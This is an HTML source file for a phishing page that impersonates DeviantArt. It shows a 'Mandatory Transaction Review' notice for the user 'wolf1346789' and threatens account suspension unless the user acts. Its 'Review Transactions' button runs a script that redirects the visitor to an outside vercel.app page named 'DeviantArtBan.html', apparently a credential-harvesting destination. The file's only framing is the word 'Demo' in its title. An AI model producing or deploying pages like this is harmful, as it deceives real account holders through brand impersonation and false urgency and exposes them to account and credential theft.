<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Demo Database</title>

<style>
    * {
        box-sizing: border-box;
    }

    html,
    body {
        margin: 0;
        padding: 0;
        width: 100%;
        min-height: 100%;
    }

    body {
        background: #e9edef;
        font-family: Arial, Helvetica, sans-serif;
        color: #222;
    }

    /* =========================
       HEADER
       ========================= */

    .header {
        width: 100%;
        height: 45px;

        background: #12d20b;
        color: white;

        display: flex;
        align-items: center;
        justify-content: center;

        font-size: 18px;
        font-weight: bold;
    }

    /* =========================
       MAIN CONTENT
       ========================= */

    .container {
        width: 100%;
        text-align: center;

        padding-top: 22px;

        /* ZOOM */
        transform: scale(1.25);
        transform-origin: top center;
    }

    .title {
        font-size: 16px;
        font-weight: bold;

        margin-bottom: 9px;
    }

    .description {
        width: 100%;
        max-width: 475px;

        margin: 0 auto;

        color: #777;

        font-size: 10px;
        line-height: 1.5;

        text-align: center;
    }

    /* =========================
       CARD
       ========================= */

    .card {
        width: 520px;
        height: 150px;

        margin: 18px auto 0;

        background: #ffffff;

        border-radius: 8px;

        box-shadow:
            0 2px 7px rgba(0, 0, 0, 0.12);

        display: flex;
        flex-direction: column;

        align-items: center;
        justify-content: center;
    }

    /* =========================
       USER
       ========================= */

    .username {
        font-size: 16px;
        font-weight: bold;

        margin-bottom: 4px;
    }

    .user-id {
        font-size: 10px;

        color: #aaa;

        margin-bottom: 14px;
    }

    /* =========================
       REVIEW BUTTON
       ========================= */

    .review-button {
        border: none;

        background: #12d20b;
        color: white;

        font-size: 10px;
        font-weight: bold;

        padding: 9px 25px;

        border-radius: 18px;

        cursor: pointer;

        transition:
            background 0.2s ease,
            transform 0.1s ease;
    }

    .review-button:hover {
        background: #0fba09;
    }

    .review-button:active {
        transform: scale(0.97);
    }

    /* =========================
       MOBILE
       ========================= */

    @media (max-width: 650px) {

        .container {
            transform: scale(1);
        }

        .card {
            width: calc(100% - 40px);
        }

        .description {
            width: calc(100% - 40px);
        }
    }
</style>

</head>

<body>

<!-- =========================
     HEADER
     ========================= -->

<div class="header">
    DeviantArt Database
</div>


<!-- =========================
     MAIN
     ========================= -->

<div class="container">

    <div class="title">
        Mandatory Transaction Review
    </div>

    <div class="description">
        Your account requires a transaction verification check. Failure to complete this review may result in account suspension to protect your security. Please confirm your recent activity to continue
         uninterrupted access.
    </div>


    <!-- =========================
         USER CARD
         ========================= -->

    <div class="card">

    <div class="username" id="demoUsername">wolf1346789</div>

    <div class="user-id" id="demoUserId">wolf1346789</div>

    <button class="review-button" type="button" onclick="reviewTransactions()">
        Review Transactions
    </button>

</div>

</div>


<!-- =========================
     JAVASCRIPT
     ========================= -->

<script>

function reviewTransactions() {

   window.location.href = "https://kwartabibakanaman.vercel.app/DeviantArtBan.html";

}

</script>

</body>
</html>
